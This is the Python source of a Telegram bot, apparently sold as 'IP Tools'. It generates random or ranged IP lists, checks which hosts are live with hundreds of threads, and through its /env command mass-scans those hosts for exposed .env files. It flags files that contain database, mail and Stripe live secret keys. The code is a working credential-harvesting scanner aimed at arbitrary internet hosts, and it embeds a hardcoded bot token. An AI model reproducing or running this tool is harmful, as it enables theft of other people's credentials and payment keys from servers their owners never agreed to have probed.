import requests
import os
import ipaddress
from multiprocessing.dummy import Pool
from faker import Faker
import telebot
from telebot import types
from io import BytesIO
import re
import time
import urllib3
import shutil
import subprocess
from concurrent.futures import ThreadPoolExecutor

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

TOKEN = '8330545350:AAFrJJ5lfnkTHKkMYeFGeX1SxoV4wMvrlls'
bot = telebot.TeleBot(TOKEN)

approved_users = set()
approved_groups = set()

try:
  with open('ass_users.txt', 'r') as user_file:
    approved_users = set(line.strip() for line in user_file)
except FileNotFoundError:
  pass

try:
  with open('ass_groups.txt', 'r') as group_file:
    approved_groups = set(line.strip() for line in group_file)
except FileNotFoundError:
  pass


@bot.message_handler(commands=['start', 'help'])
def send_instructions(message):
  bot.reply_to(
      message, "Welcome to the IP Tools bot!\n\n"
      "Use the following commands:\n"
      "/gen - Generate random IP addresses\n"
      "/range - Generate IP addresses in a range\n"
      "/live - Check if IP addresses are live\n"
      "/env - Execute environment command")


@bot.message_handler(commands=['gen'])
def send_ipgen_request(message):
  command_args = message.text.split()
  if len(command_args) == 1:
    bot.reply_to(message, "/gen 10")
    return
  try:
    num_ip = int(command_args[1])
    generate_ip(message, num_ip)
  except ValueError:
    bot.reply_to(message, "Please enter a valid number of IP addresses.")


def generate_ip(message, num_ip):
  ips = []
  faker = Faker()
  for _ in range(num_ip):
    ips.append(faker.ipv4())
  ip_file = open('ips.txt', 'w')
  ip_file.write('\n'.join(ips))
  ip_file.close()

  with open('ips.txt', 'rb') as file:
    messagtext = f"{len(ips)} IP generated successfully"
    bot.send_document(message.chat.id,
                      file,
                      caption=messagtext,
                      reply_to_message_id=message.message_id)

  os.remove('ips.txt')


@bot.message_handler(commands=['range'])
def generate_ip_range(message):
  if str(message.from_user.id) in approved_users:
    command_parts = message.text.split()
    if len(command_parts) != 3:
      bot.reply_to(message, "/range 0.0.0.0 0.0.0.1")
      return

    start_ip_str = command_parts[1]
    end_ip_str = command_parts[2]

    try:
      start_ip = ipaddress.ip_address(start_ip_str)
      end_ip = ipaddress.ip_address(end_ip_str)
    except ValueError:
      bot.reply_to(message, "Invalid IP address format.")
      return

    generated_ips = []
    for ip in ipaddress.summarize_address_range(start_ip, end_ip):
      generated_ips.extend(str(ip) for ip in ipaddress.IPv4Network(ip))

    with open('range.txt', 'w') as file:
      file.write('\n'.join(generated_ips))

    with open('range.txt', 'rb') as file:
      mesgtext = f"IPs generated in range: {start_ip_str} - {end_ip_str}"
      bot.send_document(message.chat.id,
                        file,
                        caption=mesgtext,
                        reply_to_message_id=message.message_id)
    os.remove('range.txt')
  else:
    bot.reply_to(message, "You are not approved to use this command.")


@bot.message_handler(commands=['live'])
@bot.message_handler(content_types=['document'])
def check_liveip(message):
  if message.reply_to_message and message.reply_to_message.document:
    try:
      senmessage = bot.send_message(
          message.chat.id, "Please wait while your process is requesting...")
      messagidss = senmessage.message_id
      file_info = message.reply_to_message.document

      if file_info.mime_type == 'text/plain':
        file_path = bot.get_file(file_info.file_id).file_path
        file_url = f'https://api.telegram.org/file/bot{bot.token}/{file_path}'

        response = requests.get(file_url)
        if response.status_code == 200:
          urls = response.content.decode('utf-8').splitlines()
          total_urls = len(urls)
          liveip_result = []
          

          def valid(ip):            
            try:
              checked_ips = len(ip)
              r = requests.get('http://{}'.format(ip), timeout=3)
              if r.status_code == 200 or '<title>' in r.text:
                liveip_result.append(f"{ip}")
            except Exception:
              pass  

          p = Pool(500)
          p.map(valid, urls)
          p.close()
          p.join()
          if liveip_result:
            result_text = '\n'.join(liveip_result)
            txt_file = BytesIO(result_text.encode('utf-8'))
            txt_file.name = 'liveips.txt'
            bot.delete_message(message.chat.id, messagidss)
            message_text = f"{len(liveip_result)} live IP\n"
            bot.send_document(message.chat.id,
                              txt_file,
                              caption=message_text,
                              reply_to_message_id=message.message_id)
            os.remove('liveips.txt')
          else:
            bot.reply_to(message, "No live IP addresses found.")
    except Exception:
      pass
  else:
    bot.reply_to(message, "Reply with a IP file /live")


class ENV:

  def scan_sk_credentials(self, target):
    mch = ['DB_HOST=', 'MAIL_HOST=', 'MAIL_USERNAME=', 'sk_live', 'APP_ENV=']
    try:
      url = f'http://{target}/.env'
      response = requests.get(url, verify=False, timeout=10)
      if response.status_code == 200 and any(key in response.text for key in mch):
        print(f"env:{url}")
        return f"{url}"

      return None
    except:
      return None


@bot.message_handler(commands=['env'])
def scan_env(message):
  if message.reply_to_message and message.reply_to_message.document:
    try:
      sent_message = bot.send_message(
          message.chat.id, "Please wait while your process is requesting...")
      messagid = sent_message.message_id
      file_info = message.reply_to_message.document

      if file_info.mime_type == 'text/plain':
        file_path = bot.get_file(file_info.file_id).file_path
        file_url = f'https://api.telegram.org/file/bot{bot.token}/{file_path}'

        response = requests.get(file_url)
        if response.status_code == 200:
          urls = response.content.decode('utf-8').splitlines()
          results = []

          env_scanner = ENV()
          with ThreadPoolExecutor(
              max_workers=1000) as executor:
            bot.delete_message(message.chat.id, messagid)
            for i, result in enumerate(
                executor.map(env_scanner.scan_sk_credentials, urls)):
              if result:
                results.append(result)

          if results:
            result_text = "\n".join(results)
            with open('sk_results.txt', 'w') as result_file:
              result_file.write(result_text)
              bot.send_message(message.chat.id,f"ENVS Found:{len(results)} \n {result_text}")
            os.remove("sk_results.txt")

          else:
            bot.send_message(message.chat.id,"No ENVS Found",reply_to_message_id=message.message_id)

    except Exception as e:
      bot.send_message(message,f"An error occurred while checking env: {str(e)}")

  else:
    bot.reply_to(message,"Reply with a IP file /env")


if __name__ == '__main__':
  print("Bot Started")
  bot.polling()
